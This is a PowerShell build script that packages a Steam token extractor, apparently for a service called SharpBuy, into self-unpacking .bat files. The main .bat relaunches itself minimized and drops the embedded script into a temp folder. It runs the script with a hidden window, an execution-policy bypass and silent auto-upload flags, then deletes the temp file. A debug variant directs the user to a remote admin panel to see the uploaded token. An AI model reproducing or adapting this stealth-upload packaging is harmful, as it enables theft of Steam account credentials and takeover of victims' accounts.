# One standalone .bat - script embedded after #SB_SCRIPT# marker
$ps1Path = Join-Path $PSScriptRoot 'extract_steam_token.ps1'
if (-not (Test-Path $ps1Path)) {
    $ps1Path = 'C:\Users\iliyk\Desktop\SteamTokenTools\extract_steam_token.ps1'
}
$ps1 = Get-Content -Raw -Path $ps1Path -Encoding UTF8

$header = @'
@echo off
if /i "%~1"=="_bg" goto run
start "" /min "%ComSpec%" /c ""%~f0" _bg"
exit /b

:run
set "PS1=%TEMP%\sb_extract_%RANDOM%.ps1"
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$lines=Get-Content -LiteralPath '%~f0' -Encoding UTF8; $start=-1; for($i=0;$i -lt $lines.Count;$i++){ if($lines[$i].Trim() -eq '#SB_SCRIPT#'){ $start=$i+1; break } }; if($start -lt 0){ Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('BAT corrupted','SharpBuy','OK','Error') | Out-Null; exit 1 }; $script=$lines[$start..($lines.Count-1)] -join [Environment]::NewLine; Set-Content -LiteralPath '%PS1%' -Value $script -Encoding UTF8"
if errorlevel 1 exit /b 1

powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%PS1%" -Auto -Upload -Silent
set "ERR=%ERRORLEVEL%"
del "%PS1%" 2>nul
exit /b %ERR%

#SB_SCRIPT#
'@

$debugHeader = @'
@echo off
title SharpBuy Token Extractor (debug)
echo.
echo SharpBuy - extracting Steam token...
echo.
set "PS1=%TEMP%\sb_extract_debug_%RANDOM%.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -Command "$lines=Get-Content -LiteralPath '%~f0' -Encoding UTF8; $start=-1; for($i=0;$i -lt $lines.Count;$i++){ if($lines[$i].Trim() -eq '#SB_SCRIPT#'){ $start=$i+1; break } }; if($start -lt 0){ Write-Host 'BAT corrupted' -ForegroundColor Red; exit 1 }; $script=$lines[$start..($lines.Count-1)] -join [Environment]::NewLine; Set-Content -LiteralPath '%PS1%' -Value $script -Encoding UTF8"
if errorlevel 1 (
    echo Failed to unpack script.
    pause
    exit /b 1
)
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%" -Auto -Upload
set "ERR=%ERRORLEVEL%"
del "%PS1%" 2>nul
echo.
if %ERR% NEQ 0 (
    echo Finished with error code %ERR%.
) else (
    echo Done. Check sharpbuy.onrender.com/admin and press Refresh.
)
pause
exit /b %ERR%

#SB_SCRIPT#
'@

$outPaths = @(
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_STEAM_TOKEN.bat'),
    (Join-Path $PSScriptRoot 'EXTRACT_STEAM_TOKEN.bat'),
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'SteamTokenTools\EXTRACT_STEAM_TOKEN.bat')
)

$debugOutPaths = @(
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_STEAM_TOKEN_DEBUG.bat'),
    (Join-Path $PSScriptRoot 'EXTRACT_STEAM_TOKEN_DEBUG.bat')
)

$utf8NoBom = New-Object System.Text.UTF8Encoding $false

$content = $header + [Environment]::NewLine + $ps1
foreach ($out in $outPaths) {
    $dir = Split-Path $out -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    [IO.File]::WriteAllText($out, $content, $utf8NoBom)
    Write-Host "OK: $out ($((Get-Item $out).Length) bytes, no BOM)"
}

$debugContent = $debugHeader + [Environment]::NewLine + $ps1
foreach ($out in $debugOutPaths) {
    $dir = Split-Path $out -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    [IO.File]::WriteAllText($out, $debugContent, $utf8NoBom)
    Write-Host "OK: $out (debug, no BOM)"
}

$sharpBuyPs1 = Join-Path $PSScriptRoot 'extract_steam_token.ps1'
if ((Resolve-Path $ps1Path).Path -ne (Resolve-Path $sharpBuyPs1).Path) {
    Copy-Item $ps1Path $sharpBuyPs1 -Force
}
